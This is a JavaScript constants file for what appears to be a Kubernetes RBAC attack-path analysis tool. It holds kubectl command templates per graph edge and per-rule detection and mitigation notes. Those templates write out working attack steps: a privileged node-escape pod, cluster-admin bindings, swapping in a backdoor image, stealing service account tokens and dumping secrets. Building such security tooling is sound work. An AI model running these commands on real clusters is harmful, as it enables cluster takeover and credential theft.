// constants.js
// Node/edge colors, weights, tiers, icons, attack edge kinds, rule enrichment data

/* ================================================================
   CONSTANTS
   ================================================================ */
const NODE_COLORS = {
  Identity:           '#4cc9f0',  // actor
  ServiceAccount:     '#4cc9f0',  // actor
  ClusterRole:        '#9b59b6',  // privilege
  Role:               '#9b59b6',  // privilege
  ClusterRoleBinding: '#7b6fff',  // privilege (binding)
  RoleBinding:        '#7b6fff',  // privilege (binding)
  Workload:           '#2ecc71',  // workload
  Pod:                '#2ecc71',  // workload
  Secret:             '#f1c40f',  // secret
  ConfigMap:          '#3a3d4a',  // context
  Node:               '#ff4757',  // target (host)
  Namespace:          '#3a3d4a',  // context
  Webhook:            '#ff9f43',  // hook
  CRD:                '#9b59b6',  // privilege
  CloudIdentity:      '#e056fd',  // cloud IAM identity
};
const DEFAULT_NODE_COLOR = '#555';

const NODE_ICONS = {
  Identity:           '◎',   // identity / user
  ServiceAccount:     '◈',   // service account token holder
  ClusterRole:        '⬡',   // hexagon = cluster-wide power
  Role:               '⬡',   // namespace role
  ClusterRoleBinding: '⟐',   // binding (cluster)
  RoleBinding:        '⟐',   // binding (ns)
  Workload:           '▣',   // workload / deployment box
  Pod:                '▣',   // pod
  Secret:             '⚿',   // secret/key symbol that renders reliably in SVG text
  ConfigMap:          '≡',   // config
  Node:               '◆',   // host node diamond
  Namespace:          'NS',
  Webhook:            '⚡',  // webhook trigger
  CRD:                '⬡',
  CloudIdentity:      '☁',   // cloud
};

const EDGE_COLORS = {
  can_exec:        '#ff4757',
  can_impersonate: '#ff4757',
  can_create:      '#ff7f50',
  can_patch:       '#ff7f50',
  can_delete:      '#e84c5a',
  can_get:         '#ffd166',
  can_list:        '#ffd166',
  can_portforward: '#ff7f50',
  runs_as:         '#888',
  bound_to:        '#888',
  grants:          '#888',
  member_of:       '#444',
  mounts:          '#a29bfe',
  runs_on:         '#ff4757',
  authenticates_as:'#f1c40f',
  assumes_cloud_role:'#e056fd',
  can_escalate:    '#ff4757',
  can_bind:        '#ff7f50',
  inferred:        '#ff6b81',
  granted_by:      '#888',
};
const DEFAULT_EDGE_COLOR = '#444';

/* Security category color palette (semantic, not kind-based) */
const CATEGORY_COLORS = {
  actor:     '#4cc9f0',  // identity / service account = attacker-controlled
  target:    '#ff4757',  // high-value targets = goal nodes
  workload:  '#2ecc71',  // pods / workloads
  secret:    '#f1c40f',  // secrets
  privilege: '#9b59b6',  // roles / bindings
  hook:      '#ff9f43',  // webhooks
  context:   '#3a3d4a',  // namespaces, config maps — background objects
};

/* Edge exploitation tier: 1=direct exploitation, 2=privilege chain, 3=structural */
const EDGE_TIER = {
  can_exec:1, can_impersonate:1, can_create:1, can_patch:1,
  can_delete:1, can_escalate:1, can_bind:1, inferred:1, runs_on:1,
  grants:2, bound_to:2, granted_by:2, can_get:2, can_portforward:2, can_list:2,
  authenticates_as:2, assumes_cloud_role:2,
  runs_as:3, mounts:3, member_of:3,
};

/* Edge weights — mirrors Go EdgeWeightOf() for effort visualization */
const EDGE_WEIGHT = {
  granted_by:0.1, bound_to:0.1, grants:0.1, runs_as:0.1, member_of:100,
  assumes_cloud_role:0.2, mounts:0.3, authenticates_as:0.5,
  can_exec:1.0, runs_on:1.0, can_impersonate:1.5,
  can_get:1.0, can_list:1.0, can_portforward:2.0,
  can_create:2.0, can_patch:2.0, can_delete:3.0,
  can_escalate:1.0, can_bind:1.0, inferred:2.0,
};

/* Attack-relevant edge kinds used by ingest, pathing, and scoped graph helpers */
const ATTACK_EDGE_KINDS = new Set([
  'grants','bound_to','runs_as','mounts',
  'can_exec','can_impersonate','can_create','can_patch',
  'can_delete','can_get','can_list','can_portforward',
  'can_escalate','can_bind',
  'inferred',
  'granted_by',
  'runs_on',
  'authenticates_as',
  'assumes_cloud_role',
]);

/* Goal node IDs (populated from findings before renderGraph) */
let goalNodeSet = new Set();

/* kubectl command templates for each edge type */
const ATTACK_CMD = {
  can_exec: (s, t) => ({
    action: `Execute shell in pod "${t.name}"`,
    cmds: [`kubectl exec -it ${t.name} -n ${t.namespace||'default'} -- /bin/sh`]
  }),
  can_impersonate: (s, t) => {
    const who = t.kind === 'ServiceAccount'
      ? `system:serviceaccount:${t.namespace||'default'}:${t.name}`
      : t.name;
    return {
      action: `Impersonate ${t.kind} "${t.name}"`,
      cmds: [
        `# Verify impersonation works`,
        `kubectl auth can-i '*' '*' --as="${who}"`,
        ``,
        `# List all secrets as ${t.name}`,
        `kubectl get secrets --all-namespaces --as="${who}"`
      ]
    };
  },
  can_create: (s, t) => {
    if (t.kind === 'Pod' || t.kind === 'Workload') {
      return {
        action: 'Create privileged escape pod for node breakout',
        cmds: [
          `kubectl apply -n ${t.namespace||'default'} -f - <<'EOF'`,
          `apiVersion: v1`,
          `kind: Pod`,
          `metadata:`,
          `  name: k8scout-escape`,
          `  namespace: ${t.namespace||'default'}`,
          `spec:`,
          `  hostPID: true`,
          `  hostNetwork: true`,
          `  containers:`,
          `  - name: pwn`,
          `    image: ubuntu:latest`,
          `    command: ["nsenter","-t","1","-m","-u","-i","-n","--","/bin/bash"]`,
          `    securityContext:`,
          `      privileged: true`,
          `    volumeMounts:`,
          `    - name: host-root`,
          `      mountPath: /host`,
          `  volumes:`,
          `  - name: host-root`,
          `    hostPath:`,
          `      path: /`,
          `EOF`
        ]
      };
    }
    if (t.kind === 'ClusterRoleBinding' || t.kind === 'RoleBinding') {
      return {
        action: `Create binding to escalate to cluster-admin`,
        cmds: [
          `kubectl create clusterrolebinding pwn-admin \\`,
          `  --clusterrole=cluster-admin \\`,
          `  --serviceaccount=${s.namespace||'default'}:${s.name}`
        ]
      };
    }
    return {
      action: `Create ${t.kind||'resource'} "${t.name}"`,
      cmds: [`kubectl create ${(t.kind||'resource').toLowerCase()} ${t.name} -n ${t.namespace||'default'}`]
    };
  },
  can_patch: (s, t) => ({
    action: `Inject malicious image into ${t.kind||'workload'} "${t.name}"`,
    cmds: [
      `kubectl patch ${(t.kind||'deployment').toLowerCase()} ${t.name} \\`,
      `  -n ${t.namespace||'default'} --type='json' \\`,
      `  -p='[{"op":"replace","path":"/spec/template/spec/containers/0/image",`,
      `        "value":"attacker/backdoor:latest"}]'`
    ]
  }),
  can_get: (s, t) => ({
    action: `Read secret "${t.name}"`,
    cmds: [
      `# Dump all base64-decoded values`,
      `kubectl get secret ${t.name} -n ${t.namespace||'default'} \\`,
      `  -o json | jq '.data | map_values(@base64d)'`
    ]
  }),
  can_list: (s, t) => ({
    action: `List secrets in namespace "${t.namespace||'all'}"`,
    cmds: [
      `kubectl get secrets -n ${t.namespace||'all-namespaces'} \\`,
      `  -o jsonpath='{range .items[*]}{.metadata.name}\\n{end}'`
    ]
  }),
  can_delete: (s, t) => ({
    action: `Delete ${t.kind||'resource'} "${t.name}"`,
    cmds: [
      `kubectl delete ${(t.kind||'resource').toLowerCase()}/${t.name} \\`,
      `  -n ${t.namespace||'default'} --grace-period=0 --force`
    ]
  }),
  can_portforward: (s, t) => ({
    action: `Port-forward to pod "${t.name}"`,
    cmds: [`kubectl port-forward ${t.name} -n ${t.namespace||'default'} 8080:80`]
  }),
  grants: (s, t) => ({
    action: `"${s.name}" grants permissions via "${t.name}"`,
    cmds: [
      `# Enumerate effective permissions`,
      `kubectl auth can-i --list \\`,
      `  --as=system:serviceaccount:${s.namespace||'default'}:${s.name}`
    ]
  }),
  bound_to: (s, t) => ({
    action: `"${s.name}" is a subject in ${t.kind||'binding'} "${t.name}"`,
    cmds: [
      `kubectl get ${(t.kind||'clusterrolebinding').toLowerCase()} ${t.name} -o yaml`
    ]
  }),
  runs_as: (s, t) => ({
    action: `Workload "${s.name}" runs as SA "${t.name}" — exec to steal token`,
    cmds: [
      `# Exec into the workload pod, then read the SA token`,
      `kubectl exec -it $(kubectl get pods -n ${s.namespace||'default'} \\`,
      `  -l app=${s.name} -o name | head -1) \\`,
      `  -n ${s.namespace||'default'} -- \\`,
      `  cat /var/run/secrets/kubernetes.io/serviceaccount/token`
    ]
  }),
  mounts: (s, t) => ({
    action: `Secret "${t.name}" is mounted in workload "${s.name}"`,
    cmds: [
      `# Exec into pod and read mounted secret`,
      `kubectl exec -it $(kubectl get pods -n ${s.namespace||'default'} \\`,
      `  -l app=${s.name} -o name | head -1) \\`,
      `  -n ${s.namespace||'default'} -- \\`,
      `  find /var/run/secrets /etc -maxdepth 5 2>/dev/null | xargs grep -l '.' 2>/dev/null`
    ]
  }),
  member_of: (s, t) => ({
    action: `"${s.name}" is an identity for "${t.name}"`,
    cmds: [`kubectl get sa ${t.name} -n ${t.namespace||'default'} -o yaml`]
  }),
  runs_on: (s, t) => ({
    action: `Container escape from pod "${s.name}" to node "${t.name}"`,
    cmds: [
      `# Pod is privileged/hostPID — escape to node`,
      `kubectl exec -it ${s.name} -n ${s.namespace||'default'} -- \\`,
      `  nsenter -t 1 -m -u -i -n -- /bin/bash`
    ]
  }),
  authenticates_as: (s, t) => ({
    action: `Token theft: secret "${s.name}" authenticates as SA "${t.name}"`,
    cmds: [
      `# Read the SA token from the secret`,
      `kubectl get secret ${s.name} -n ${s.namespace||'default'} \\`,
      `  -o jsonpath='{.data.token}' | base64 -d`
    ]
  }),
  assumes_cloud_role: (s, t) => ({
    action: `Cloud role assumption: "${s.name}" → cloud identity "${t.name}"`,
    cmds: [
      `# SA is annotated with cloud IAM role — exec into a pod running as this SA`,
      `# to obtain cloud credentials via metadata endpoint or projected token`
    ]
  }),
  can_escalate: (s, t) => ({
    action: `Escalate role "${t.name}" — add permissions beyond own level`,
    cmds: [
      `# This SA can escalate ClusterRole/Role "${t.name}"`,
      `kubectl edit ${(t.kind||'clusterrole').toLowerCase()} ${t.name}`
    ]
  }),
  can_bind: (s, t) => ({
    action: `Bind role "${t.name}" — create new role bindings`,
    cmds: [
      `kubectl create clusterrolebinding pwn-bind \\`,
      `  --clusterrole=${t.name} \\`,
      `  --serviceaccount=${s.namespace||'default'}:${s.name}`
    ]
  }),
  granted_by: (s, t) => ({
    action: `"${s.name}" is granted permissions by ${t.kind||'binding'} "${t.name}"`,
    cmds: [`kubectl get ${(t.kind||'clusterrolebinding').toLowerCase()} ${t.name} -o yaml`]
  }),
};

/* ================================================================
   RULE ENRICHMENT — per-rule impact, detection, mitigation
   ================================================================ */
const RULE_ENRICHMENT = {
  'PRIV-LIST-SECRETS': {
    description: 'This identity can list Secrets across one or more namespaces, exposing key names and enabling targeted extraction.',
    impact: 'An attacker can enumerate all secret names, then use `get` to read high-value credentials — API keys, TLS certificates, database passwords, and service account tokens — enabling lateral movement and privilege escalation across the cluster.',
    detection: 'Monitor `secrets` list operations in Kubernetes audit logs (verb=list, resource=secrets). Alert on unexpected service accounts or users performing cross-namespace secret enumeration.',
    mitigation: ['Apply least-privilege: grant `get` on specific secret names, never wildcard list', 'Enable audit logging for secrets access', 'Use Kubernetes Secrets Store CSI driver to keep secrets in external vaults', 'Regularly rotate secrets and review RBAC bindings'],
  },
  'PRIV-GET-SECRETS': {
    description: 'This identity can read Secret values directly, gaining access to plaintext credentials stored in etcd.',
    impact: 'Direct read access to secrets allows an attacker to extract database passwords, API tokens, and SSH keys in a single `kubectl get secret` call. All services depending on those secrets become compromised.',
    detection: 'Alert on `secrets` get/watch operations from unexpected principals in audit logs. Use Falco rules for secret reads from non-system namespaces.',
    mitigation: ['Restrict secrets access to specific named secrets', 'Audit all ClusterRoles with secrets/get permissions', 'Consider secret envelope encryption at rest (KMS provider)', 'Use Vault or external secrets manager instead of Kubernetes Secrets'],
  },
  'PRIVESC-CREATE-ROLEBINDING': {
    description: 'This identity can create RoleBindings, allowing it to grant any permission within a namespace to any subject.',
    impact: 'An attacker can bind `cluster-admin` or any powerful ClusterRole to their own user/SA, immediately achieving namespace-level privilege escalation. This is a one-step path to full namespace compromise.',
    attacker_cmd: 'kubectl create rolebinding pwn-admin \\\n  --clusterrole=cluster-admin \\\n  --serviceaccount=default:attacker-sa \\\n  -n target-namespace',
    detection: 'Alert on RoleBinding create/patch events in audit logs, especially bindings referencing cluster-admin or wildcard roles.',
    mitigation: ['Remove rolebindings/create from non-admin service accounts', 'Use OPA/Kyverno to prevent bindings to cluster-admin', 'Apply namespace-level network policies to limit blast radius'],
  },
  'PRIVESC-CREATE-CLUSTERROLEBINDING': {
    description: 'This identity can create ClusterRoleBindings — the most dangerous RBAC escalation path, granting cluster-wide permissions.',
    impact: 'Creating a ClusterRoleBinding to cluster-admin grants full control over every resource in the cluster. This is a complete cluster takeover in one API call.',
    attacker_cmd: 'kubectl create clusterrolebinding cluster-pwn \\\n  --clusterrole=cluster-admin \\\n  --serviceaccount=default:attacker-sa',
    detection: 'Alert immediately on any ClusterRoleBinding creation. This is an almost always-malicious action from non-system principals.',
    mitigation: ['This permission should exist only for cluster-admin users', 'Implement strict admission control (OPA Gatekeeper) blocking CRB creation by non-humans', 'Monitor with Falco: rule k8s_cluster_role_binding'],
  },
  'TAKEOVER-PATCH-DEPLOYMENT': {
    description: 'This identity can patch Deployments, enabling image replacement or environment variable injection across all pods in a deployment.',
    impact: 'An attacker can swap the container image to a backdoored version, inject malicious environment variables, or add init containers with reverse shells — compromising all current and future pods in the deployment.',
    attacker_cmd: 'kubectl patch deployment target-app -n ns --type=\'json\' \\\n  -p=\'[{"op":"replace","path":"/spec/template/spec/containers/0/image","value":"attacker/backdoor:latest"}]\'',
    detection: 'Alert on Deployment patch events from non-CI service accounts. Monitor for image changes to non-registry-approved images.',
    mitigation: ['Restrict patch permissions to CI/CD service accounts only', 'Use admission webhooks to validate images against allowed registries', 'Enable image signing verification (Notary/Cosign)'],
  },
  'ESCAPE-CREATE-POD': {
    description: 'This identity can create Pods without restrictions, enabling immediate node breakout via privileged containers with hostPath mounts.',
    impact: 'Creating a pod with `privileged: true`, `hostPID: true`, and `hostPath: /` gives full root access to the underlying node. From there, an attacker can read `/etc/kubernetes/pki`, access the kubelet kubeconfig, and pivot to the entire cluster.',
    attacker_cmd: 'kubectl apply -f - <<\'EOF\'\napiVersion: v1\nkind: Pod\nmetadata:\n  name: k8s-escape\nspec:\n  hostPID: true\n  hostNetwork: true\n  containers:\n  - name: pwn\n    image: ubuntu:latest\n    command: ["nsenter","-t","1","-m","-u","-i","-n","--","/bin/bash"]\n    securityContext:\n      privileged: true\n    volumeMounts:\n    - name: host\n      mountPath: /host\n  volumes:\n  - name: host\n    hostPath:\n      path: /\nEOF',
    detection: 'Block and alert on pod creation with privileged:true or hostPath mounts. Use Pod Security Standards (Restricted profile).',
    mitigation: ['Enforce Pod Security Standards at Restricted level', 'Use OPA to deny hostPath, hostPID, hostNetwork', 'Audit all principals with pods/create', 'Apply namespace-scoped resource quotas'],
  },
  'RUNTIME-EXEC-PODS': {
    description: 'This identity can exec into running pods, providing interactive shell access to container environments.',
    impact: 'Shell access to a pod allows credential theft (reading mounted secrets and env vars), network reconnaissance, pivoting to other services, and exploitation of any running service. If the pod is privileged, this directly leads to node compromise.',
    attacker_cmd: 'kubectl exec -it <pod-name> -n <namespace> -- /bin/sh\n# Then read secrets:\ncat /var/run/secrets/kubernetes.io/serviceaccount/token\nenv | grep -i password',
    detection: 'Monitor pods/exec events in audit logs. Alert on exec from non-approved principals or into system namespaces.',
    mitigation: ['Remove pods/exec from all non-developer RBAC roles', 'Implement ephemeral container policy', 'Use read-only filesystems on containers'],
  },
  'PRIVESC-IMPERSONATE': {
    description: 'This identity can impersonate other users or service accounts, acting with any other identity\'s permissions.',
    impact: 'Impersonation allows an attacker to act as cluster-admin, any high-privileged service account, or any user — bypassing all their own permission restrictions. This is equivalent to having all permissions of every impersonatable identity.',
    detection: 'Audit logs will show impersonating user headers. Alert on impersonation of system:masters or cluster-admin roles.',
    mitigation: ['Restrict impersonation to only authentication proxies', 'Never grant impersonation to workload service accounts', 'Audit all identities with impersonate verb'],
  },
  'RUNTIME-PORTFORWARD': {
    description: 'This identity can port-forward to pods, enabling direct TCP tunnels to internal services.',
    impact: 'Port-forwarding bypasses NetworkPolicies and exposes internal services (databases, admin UIs, internal APIs) directly to the attacker\'s machine without any network restrictions.',
    detection: 'Monitor pods/portforward events. Alert on port-forward to database or admin pods.',
    mitigation: ['Restrict portforward to specific pods/namespaces', 'Implement NetworkPolicy to limit internal service exposure', 'Use service mesh mutual TLS for service-to-service auth'],
  },
  'CONFIG-PRIVILEGED-CONTAINER': {
    description: 'A running workload has containers with `securityContext.privileged: true`, granting root capabilities equivalent to the host.',
    impact: 'A privileged container can directly access host devices, modify kernel parameters, escape to the host namespace, and achieve full node compromise without any additional steps.',
    detection: 'Use Policy controllers (Kyverno/OPA) to detect and deny privileged containers. Alert on container creation with privileged=true in admission webhooks.',
    mitigation: ['Enforce Pod Security Standards (Restricted) cluster-wide', 'Use OPA Gatekeeper to block privileged containers', 'Audit existing workloads with: kubectl get pods -A -o json | jq \'..securityContext.privileged\'', 'If required, strictly scope to dedicated namespaces with extra monitoring'],
  },
  'CONFIG-HOSTPATH-MOUNT': {
    description: 'A workload mounts a host filesystem path, potentially including sensitive directories like `/`, `/etc`, `/var/lib/kubelet`.',
    impact: 'hostPath mounts to root or sensitive paths allow reading node credentials, kubelet certificates, containerd socket, and potentially modifying system files — enabling node breakout without privileged mode.',
    detection: 'Block and alert via admission webhooks on hostPath volume creation. Audit existing mounts.',
    mitigation: ['Deny all hostPath volumes via Pod Security Standards', 'If required, restrict to specific safe paths (not /, /etc, /var)', 'Use CSI drivers or PersistentVolumes instead of hostPath'],
  },
  'CONFIG-HOST-NAMESPACE': {
    description: 'A workload uses hostPID or hostNetwork, sharing the host\'s process or network namespace.',
    impact: 'hostPID allows seeing and signaling all host processes. hostNetwork gives access to the host network stack including kubelet API, etcd, and cloud metadata endpoints (169.254.169.254).',
    detection: 'Alert on pod spec with hostPID=true or hostNetwork=true at admission time.',
    mitigation: ['Block hostPID and hostNetwork via Pod Security Standards', 'Apply OPA Gatekeeper constraints', 'Audit existing workloads'],
  },
  'PRIVESC-CREATE-SA-TOKEN': {
    description: 'This identity can create service account tokens, generating long-lived credentials for any service account.',
    impact: 'An attacker can mint tokens for high-privileged service accounts (e.g., kube-system service accounts) and use them to escalate to cluster-admin.',
    attacker_cmd: 'kubectl create token kube-dns -n kube-system --duration=876000h',
    detection: 'Alert on serviceaccounts/token creation from non-system principals.',
    mitigation: ['Restrict token creation to only the service itself', 'Use projected service account tokens with short TTL', 'Audit bound service account tokens via OIDC'],
  },
  'CONFIG-WILDCARD-VERBS': {
    description: 'A ClusterRole or Role grants wildcard (*) verbs, effectively giving all permissions on matched resources.',
    impact: 'Wildcard verb grants bypass intent-based least-privilege and allow any operation including delete, patch, and escalate. Combined with wildcard resources, this is equivalent to cluster-admin.',
    detection: 'Audit all RBAC roles for wildcard verb rules. Alert on new roles with * verbs.',
    mitigation: ['Replace wildcard verbs with explicit lists', 'Run kubectl get clusterroles,roles -A -o json | jq to audit', 'Implement RBAC drift detection in CI/CD'],
  },
  'PRIVESC-CLUSTER-ADMIN-BINDING': {
    description: 'An identity is bound to the cluster-admin ClusterRole, granting unrestricted access to all Kubernetes resources.',
    impact: 'cluster-admin is the highest privilege in Kubernetes. Full read/write access to all resources including secrets, nodes, namespaces, and the ability to create further bindings.',
    detection: 'Alert on any new ClusterRoleBinding to cluster-admin. Maintain an allowlist of expected cluster-admin subjects.',
    mitigation: ['Audit all cluster-admin bindings: kubectl get clusterrolebindings -o json | jq', 'Remove unnecessary bindings', 'Prefer namespace-scoped admin roles', 'Implement break-glass procedure for cluster-admin access'],
  },
  'CONFIG-SECRETS-IN-ENV': {
    description: 'A workload exposes Kubernetes Secrets as environment variables, making them readable via pod inspection or exec.',
    impact: 'Any process in the container (including injected code) can read `$SECRET_VALUE`. Secrets in env vars are also logged by many frameworks, appear in crash dumps, and persist in container layer history.',
    detection: 'Scan pod specs for env.valueFrom.secretKeyRef. Alert on exec into pods with known secret env vars.',
    mitigation: ['Use mounted secret files instead of env vars (harder to accidentally log)', 'Implement secrets management via Vault with sidecar injection', 'Regular credential rotation'],
  },
  'CONFIG-AUTOMOUNT-SA-TOKEN': {
    description: 'Service account tokens are auto-mounted in pods, making them available to any process that can exec into the container.',
    impact: 'The mounted token can be used to call the Kubernetes API with the pod\'s service account permissions. If over-privileged, this enables lateral movement and privilege escalation from a pod exec foothold.',
    detection: 'Monitor /var/run/secrets/kubernetes.io/serviceaccount/token file access via Falco.',
    mitigation: ['Set automountServiceAccountToken: false in pod specs and service accounts', 'Only mount tokens for pods that genuinely need API access', 'Use projected tokens with audience restriction'],
  },
};

